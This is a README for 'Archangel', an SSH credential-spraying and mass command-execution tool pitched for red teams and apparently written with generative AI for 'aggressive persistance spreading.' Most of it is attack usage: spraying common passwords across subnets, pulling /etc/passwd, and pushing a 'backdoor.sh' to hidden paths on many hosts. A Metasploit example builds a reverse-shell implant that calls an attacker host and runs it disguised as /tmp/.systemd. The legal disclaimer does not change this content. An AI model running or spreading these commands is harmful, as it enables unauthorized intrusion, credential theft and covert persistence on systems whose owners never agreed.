# 🔱 Archangel - SSH Automation & Credential Spraying Tool

A powerful, multi-threaded SSH automation tool designed for penetration testing and red team operations. Execute commands, transfer files, and spray credentials across multiple hosts simultaneously.

## DISCLAIMER: This tool was written using Generative AI, this tool was made to address a need for faster, aggressive persistance spreading.

```
    ╔═══════════════════════════════════════════════════════════╗
    ║              ARCHANGEL - SSH Automation Tool              ║
    ║         Remote Command Execution & File Transfer          ║
    ╚═══════════════════════════════════════════════════════════╝
```

## ⚡ Features

- 🎯 **Credential Spraying** - Test multiple username/password combinations across hosts
- 🔑 **Multiple Authentication** - Support for passwords and SSH keys (RSA, Ed25519, DSS, ECDSA)
- ⚙️ **Command Execution** - Run commands on single or multiple hosts
- 📤 **File Transfer** - Upload/download files via SFTP
- 📜 **Script Execution** - Execute local scripts on remote hosts
- 🧵 **Multi-threaded** - Concurrent connections for speed (configurable)
- 🔇 **Quiet Mode** - Minimal output for operational use
- 🔊 **Verbose Mode** - Detailed output for debugging
- 🛡️ **Robust Error Handling** - Clean output, no verbose exceptions
- 🔄 **Auto-retry** - Handles transient connection failures

## 🚀 Installation

```bash
# Install paramiko
pip3 install paramiko

# Make executable
chmod +x archangel.py

# Test
python3 archangel.py --help
```

## ⚡ Quick Start

### Single Host Command
```bash
python3 archangel.py --hosts 192.168.1.100 --users root --passwords toor --command "whoami"
```

### Credential Spray
```bash
python3 archangel.py --ips hosts.txt --users users.txt --passwords passwords.txt --command "id"
```

### File Upload
```bash
python3 archangel.py --hosts 192.168.1.100 --users admin --passwords admin --upload payload.sh:/tmp/payload.sh
```

## 📚 Usage Examples

### Command Execution

```bash
# Single host
python3 archangel.py --hosts 10.55.10.115 --users ralph --passwords Password123!@# --command "uname -a"

# Multiple hosts
python3 archangel.py --ips targets.txt --users root --passwords toor --command "whoami"

# With SSH key
python3 archangel.py --hosts 192.168.1.100 --users admin --keys ~/.ssh/id_rsa --command "ls -la"
```

### Credential Spraying

```bash
# Spray across network
python3 archangel.py \
  --ips subnet_hosts.txt \
  --users common_users.txt \
  --passwords common_passwords.txt \
  --command "id" \
  --threads 10
```

### File Operations

```bash
# Upload file
python3 archangel.py --hosts 10.55.20.100 --users admin --passwords pass --upload payload.sh:/tmp/payload.sh

# Download file
python3 archangel.py --hosts 10.55.10.98 --users root --passwords toor --download /etc/passwd:passwd.txt

# Upload to multiple hosts
python3 archangel.py --ips hosts.txt --users root --passwords pass --upload backdoor.sh:/tmp/.update
```

### Script Execution

```bash
# Execute enumeration script
python3 archangel.py --hosts 10.55.20.101 --users ralph --passwords pass --script enumerate.sh

# Execute on multiple hosts
python3 archangel.py --ips targets.txt --users admin --passwords admin --script post_exploit.sh --threads 5
```

### Advanced Operations

```bash
# Quiet mode (minimal output)
python3 archangel.py --quiet --ips network.txt --users users.txt --passwords passwords.txt --command "whoami"

# Verbose mode (debugging)
python3 archangel.py --verbose --hosts 10.55.10.65 --users ec2-user --passwords ec2-user --command "id"

# Custom SSH port
python3 archangel.py --hosts 192.168.1.100 --users admin --passwords admin --port 2222 --command "hostname"

# High thread count
python3 archangel.py --ips large_subnet.txt --users root --passwords toor --command "uptime" --threads 20

# Multiple SSH keys
python3 archangel.py --hosts 192.168.1.100 --users root --keys /path/to/keys/ --command "whoami"
```

## 📖 Command Reference

### Required Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `--hosts` | Single target IP/hostname | `--hosts 192.168.1.100` |
| `--ips` | File with IPs (one per line) | `--ips targets.txt` |
| `--users` | Username or file | `--users root` or `--users users.txt` |
| `--passwords` | Password or file | `--passwords toor` or `--passwords passwords.txt` |
| `--keys` | SSH key or directory | `--keys ~/.ssh/id_rsa` or `--keys /keys/` |

Must specify either `--hosts` OR `--ips`, and either `--passwords` OR `--keys`

### Action Arguments (at least one required)

| Argument | Description | Example |
|----------|-------------|---------|
| `--command` | Command to execute | `--command "whoami"` |
| `--upload` | Upload file `local:remote` | `--upload payload.sh:/tmp/payload.sh` |
| `--download` | Download file `remote:local` | `--download /etc/passwd:passwd.txt` |
| `--script` | Execute local script | `--script enumerate.sh` |

### Optional Arguments

| Argument | Default | Description |
|----------|---------|-------------|
| `--port` | 22 | SSH port |
| `--threads` | 4 | Number of concurrent threads |
| `--quiet` `-q` | Off | Minimal output mode |
| `--verbose` `-v` | Off | Detailed output mode |

## 📄 File Formats

### Hosts File
```
192.168.1.10
192.168.1.20
10.10.10.50
webserver.local
```

### Users File
```
root
admin
ubuntu
user
```

### Passwords File
```
password
Password123
admin
toor
```


| Scenario | Recommended Threads |
|----------|-------------------|
| Local network | 10-20 |
| Internet targets | 4-8 |
| Slow connections | 2-4 |
| Fast switches | 20-50 |

## 🔧 Troubleshooting

### No successful connections

**Checklist:**
- ✅ Verify network: `ping target`
- ✅ Check SSH port: `nc -zv target 22`
- ✅ Test manually: `ssh user@target`
- ✅ Try verbose mode: `--verbose`

### Slow execution

```bash
# Increase threads
python3 archangel.py --threads 20 ...

# Use quiet mode
python3 archangel.py --quiet ...
```

### Too much output

```bash
# Use quiet mode
python3 archangel.py --quiet ...
```

## 🔐 Security Considerations

⚠️ **This tool is NOISY:**
- Leaves SSH logs on all targets
- Authentication attempts are logged
- Uploaded files may be detected

### Best Practices

1. Use with authorization only
2. Clean up after operations
3. Use rate limiting (`--threads 2`)
4. Secure credential files (`chmod 600`)
5. Don't commit credentials to git

## 🆚 Comparison with Other Tools

| Feature | Archangel | Ansible | pssh | Metasploit |
|---------|-----------|---------|------|------------|
| Credential Spray | ✅ | ❌ | ❌ | ✅ |
| Multi-host | ✅ | ✅ | ✅ | ✅ |
| File Transfer | ✅ | ✅ | ❌ | ✅ |
| No Config | ✅ | ❌ | ✅ | ❌ |

## 📝 Integration Examples

### With Metasploit
```bash
# Generate payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o implant

# Deploy with Archangel
python3 archangel.py --ips targets.txt --users root --passwords toor --upload implant:/tmp/.systemd --command "chmod +x /tmp/.systemd && /tmp/.systemd &"
```

## ⚠️ Legal Disclaimer

**AUTHORIZED USE ONLY**

This tool is designed for authorized penetration testing, red team exercises, and system administration only.

**Unauthorized access to computer systems is illegal.**

By using this tool, you agree to:
- Only use it on systems you own or have written permission to test
- Comply with all applicable laws and regulations
- Take responsibility for your actions

The authors are not responsible for misuse of this tool.

---

**Made with 🔱 for the red team community**

*"Command your arsenal with precision"*
